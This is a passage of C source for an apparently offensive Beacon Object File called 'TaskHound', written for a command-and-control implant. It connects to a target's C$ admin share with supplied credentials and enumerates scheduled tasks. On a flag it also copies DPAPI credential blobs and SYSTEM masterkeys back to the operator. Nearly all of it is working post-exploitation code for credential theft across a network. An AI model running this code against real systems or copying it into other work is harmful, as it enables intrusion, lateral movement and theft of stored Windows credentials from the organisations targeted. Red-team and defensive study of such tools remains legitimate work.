                      pFindFirstFileA fpFindFirstFileA, pFindNextFileA fpFindNextFileA,
                      pFindClose fpFindClose, pCreateFileA fpCreateFileA,
                      pReadFile fpReadFile, pCloseHandle fpCloseHandle,
                      pGetFileSize fpGetFileSize, pVirtualAlloc fpVirtualAlloc,
                      pVirtualFree fpVirtualFree, pWriteFile fpWriteFile,
                      pCreateDirectoryA fpCreateDirectoryA, pGetLastError fpGetLastError) {
    
    WIN32_FIND_DATAA findFileData;
    char search_path[MAX_PATH_LENGTH];
    char full_path[MAX_PATH_LENGTH];
    char save_path[MAX_PATH_LENGTH];
    char masterkeys_dir[MAX_PATH_LENGTH];
    int masterkey_count = 0;
    
    // Build masterkey path: \\target\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\*
    if (!bof_strcpy_safe(search_path, remote_path, sizeof(search_path))) return 0;
    if (!bof_strcat_safe(search_path, "\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\*", sizeof(search_path))) return 0;
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating SYSTEM masterkeys...\n");
    
    HANDLE hFind = fpFindFirstFileA(search_path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate masterkeys (Error: %d)\n", fpGetLastError());
        return 0;
    }
    
    // Create masterkeys save directory
    if (!create_masterkeys_directory(save_dir, target, fpCreateDirectoryA, masterkeys_dir, sizeof(masterkeys_dir))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create masterkeys directory\n");
        fpFindClose(hFind);
        return 0;
    }
    
    do {
        // Skip directories and special entries
        if (findFileData.cFileName[0] == '.' ||
            (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            continue;
        }
        
        // Get file size
        DWORD file_size = findFileData.nFileSizeLow;
        if (file_size == 0 || file_size > 100000) {  // Skip very large files
            continue;
        }
        
        // Build full remote path
        if (!bof_strcpy_safe(full_path, remote_path, sizeof(full_path))) continue;
        if (!bof_strcat_safe(full_path, "\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\", sizeof(full_path))) continue;
        if (!bof_strcat_safe(full_path, findFileData.cFileName, sizeof(full_path))) continue;
        
        // Read the masterkey file
        HANDLE hFile = fpCreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }
        
        // Allocate buffer for file content
        char* buffer = (char*)fpVirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            fpCloseHandle(hFile);
            continue;
        }
        
        // Read file content
        DWORD bytes_read;
        if (!fpReadFile(hFile, buffer, file_size, &bytes_read, NULL) || bytes_read != file_size) {
            fpVirtualFree(buffer, 0, MEM_RELEASE);
            fpCloseHandle(hFile);
            continue;
        }
        fpCloseHandle(hFile);
        
        // Build save path
        if (!build_directory_path(save_path, masterkeys_dir, findFileData.cFileName, sizeof(save_path))) {
            fpVirtualFree(buffer, 0, MEM_RELEASE);
            continue;
        }
        
        // Write the masterkey file
        if (write_raw_file(save_path, buffer, file_size, fpCreateFileA, fpWriteFile, fpCloseHandle, fpGetLastError)) {
            masterkey_count++;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Collected masterkey: %s (%d bytes)\n", findFileData.cFileName, file_size);
        }
        
        fpVirtualFree(buffer, 0, MEM_RELEASE);
        
    } while (fpFindNextFileA(hFind, &findFileData) != 0);
    
    fpFindClose(hFind);
    return masterkey_count;
}

// ============================================================================
// Main Entry Point
// ============================================================================

void go(char* args, int len) {
    datap parser;
    char* target;
    char* username;
    char* password;
    char* save_dir;
    char* flags;
    BOOL show_unsaved_creds = FALSE;
    BOOL grab_blobs = FALSE;
    char remote_path[512];
    NETRESOURCEA netResource;
    DWORD result;
    
    // Get API functions
    HMODULE hMpr = LoadLibraryA("mpr.dll");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    
    if (!hMpr || !hKernel32) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load required libraries\n");
        return;
    }
    
    pWNetAddConnection2A fpWNetAddConnection2A = (pWNetAddConnection2A)GetProcAddress(hMpr, "WNetAddConnection2A");
    pWNetCancelConnection2A fpWNetCancelConnection2A = (pWNetCancelConnection2A)GetProcAddress(hMpr, "WNetCancelConnection2A");
    pFindFirstFileA fpFindFirstFileA = (pFindFirstFileA)GetProcAddress(hKernel32, "FindFirstFileA");
    pFindNextFileA fpFindNextFileA = (pFindNextFileA)GetProcAddress(hKernel32, "FindNextFileA");
    pFindClose fpFindClose = (pFindClose)GetProcAddress(hKernel32, "FindClose");
    pCreateFileA fpCreateFileA = (pCreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    pReadFile fpReadFile = (pReadFile)GetProcAddress(hKernel32, "ReadFile");
    pCloseHandle fpCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    pGetFileSize fpGetFileSize = (pGetFileSize)GetProcAddress(hKernel32, "GetFileSize");
    pVirtualAlloc fpVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    pVirtualFree fpVirtualFree = (pVirtualFree)GetProcAddress(hKernel32, "VirtualFree");
    pWriteFile fpWriteFile = (pWriteFile)GetProcAddress(hKernel32, "WriteFile");
    pCreateDirectoryA fpCreateDirectoryA = (pCreateDirectoryA)GetProcAddress(hKernel32, "CreateDirectoryA");
    pGetLastError fpGetLastError = (pGetLastError)GetProcAddress(hKernel32, "GetLastError");
    
    // Check if all required functions are available
    if (!fpWNetAddConnection2A || !fpWNetCancelConnection2A || !fpFindFirstFileA || 
        !fpFindNextFileA || !fpFindClose || !fpCreateFileA || !fpReadFile || 
        !fpCloseHandle || !fpGetFileSize || !fpVirtualAlloc || !fpVirtualFree) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve required API functions\n");
        return;
    }
    
    // Parse arguments - Always expect 5 cstr parameters
    BeaconDataParse(&parser, args, len);
    
    target = BeaconDataExtract(&parser, NULL);
    username = BeaconDataExtract(&parser, NULL);
    password = BeaconDataExtract(&parser, NULL);
    save_dir = BeaconDataExtract(&parser, NULL);
    flags = BeaconDataExtract(&parser, NULL);
    
    // Validate required target
    if (!target || bof_strlen(target) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target hostname/IP is required\n");
        FreeLibrary(hMpr);
        return;
    }
    
    // Handle empty strings as NULL for optional parameters
    if (username && bof_strlen(username) == 0) username = NULL;
    if (password && bof_strlen(password) == 0) password = NULL;
    if (save_dir && bof_strlen(save_dir) == 0) save_dir = NULL;
    
    // Parse flags
    if (flags && bof_strlen(flags) > 0) {
        if (bof_strstr(flags, "-unsaved-creds")) {
            show_unsaved_creds = TRUE;
        }
        if (bof_strstr(flags, "-grab-blobs")) {
            grab_blobs = TRUE;
        }
    }
    
    // Check if write functions are available when save_dir is specified
    if (save_dir && (!fpWriteFile || !fpCreateDirectoryA)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve file write API functions\n");
        FreeLibrary(hMpr);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] TaskHound - Remote Task Collection\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target: %s\n", target);
    
    if (username) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Using credentials: %s\n", username);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Using current user context\n");
    }
    
    if (save_dir) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Save directory: %s\n", save_dir);
    }
    
    if (show_unsaved_creds) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Showing tasks without stored credentials\n");
    }
    
    if (grab_blobs) {
        if (save_dir) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Will collect credential blobs and masterkeys\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Warning: -grab-blobs requires -save flag\n");
            grab_blobs = FALSE;
        }
    }
    
    // Setup network connection
    bof_memset(&netResource, 0, sizeof(NETRESOURCEA));
    netResource.dwType = RESOURCETYPE_DISK;
    netResource.dwDisplayType = RESOURCEDISPLAYTYPE_SHARE;
    netResource.dwUsage = RESOURCEUSAGE_CONNECTABLE;
    
    // Build UNC path for admin share
    if (!bof_strcpy_safe(remote_path, "\\\\", sizeof(remote_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build remote path\n");
        FreeLibrary(hMpr);
        return;
    }
    if (!bof_strcat_safe(remote_path, target, sizeof(remote_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build remote path\n");
        FreeLibrary(hMpr);
        return;
    }
    if (!bof_strcat_safe(remote_path, "\\C$", sizeof(remote_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build remote path\n");
        FreeLibrary(hMpr);
        return;
    }
    netResource.lpRemoteName = remote_path;
    
    // Attempt to connect with provided credentials or current context
    result = fpWNetAddConnection2A(&netResource, password, username, 0);
    
    if (result != NO_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to connect to %s (Error: %d)\n", remote_path, result);
        FreeLibrary(hMpr);
        return;
    }
    
    // Build base Tasks directory path
    char tasks_base_path[MAX_PATH_LENGTH];
    if (!bof_strcpy_safe(tasks_base_path, remote_path, sizeof(tasks_base_path)) ||
        !bof_strcat_safe(tasks_base_path, "\\Windows\\System32\\Tasks", sizeof(tasks_base_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build Tasks directory path\n");
        fpWNetCancelConnection2A(remote_path, 0, TRUE);
        FreeLibrary(hMpr);
        return;
    }
    
    // Recursively traverse the Tasks directory and all subdirectories
    int task_count = traverse_task_directory(tasks_base_path, NULL, target, save_dir, show_unsaved_creds,
                                           fpFindFirstFileA, fpFindNextFileA, fpFindClose, 
                                           fpCreateFileA, fpReadFile, fpCloseHandle, fpGetFileSize,
                                           fpVirtualAlloc, fpVirtualFree, fpWriteFile, 
                                           fpCreateDirectoryA, fpGetLastError);
    
    // Collect credential blobs and masterkeys if requested
    int blob_count = 0;
    int masterkey_count = 0;
    
    if (grab_blobs && save_dir) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Collecting DPAPI files...\n");
        
        // Collect credential blobs
        blob_count = collect_credential_blobs(remote_path, target, save_dir,
                                             fpFindFirstFileA, fpFindNextFileA, fpFindClose,
                                             fpCreateFileA, fpReadFile, fpCloseHandle,
                                             fpGetFileSize, fpVirtualAlloc, fpVirtualFree,
                                             fpWriteFile, fpCreateDirectoryA, fpGetLastError);
        
        // Collect masterkeys
        masterkey_count = collect_masterkeys(remote_path, target, save_dir,
                                           fpFindFirstFileA, fpFindNextFileA, fpFindClose,
                                           fpCreateFileA, fpReadFile, fpCloseHandle,
                                           fpGetFileSize, fpVirtualAlloc, fpVirtualFree,
                                           fpWriteFile, fpCreateDirectoryA, fpGetLastError);
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] DPAPI collection complete: %d credential blobs, %d masterkeys\n", 
                    blob_count, masterkey_count);
    }
    
    // Clean up network connection
    fpWNetCancelConnection2A(remote_path, 0, TRUE);
    FreeLibrary(hMpr);
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Collection complete. Found %d tasks", task_count);
    if (grab_blobs && save_dir) {
        BeaconPrintf(CALLBACK_OUTPUT, ", %d credential blobs, %d masterkeys\n", blob_count, masterkey_count);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }
}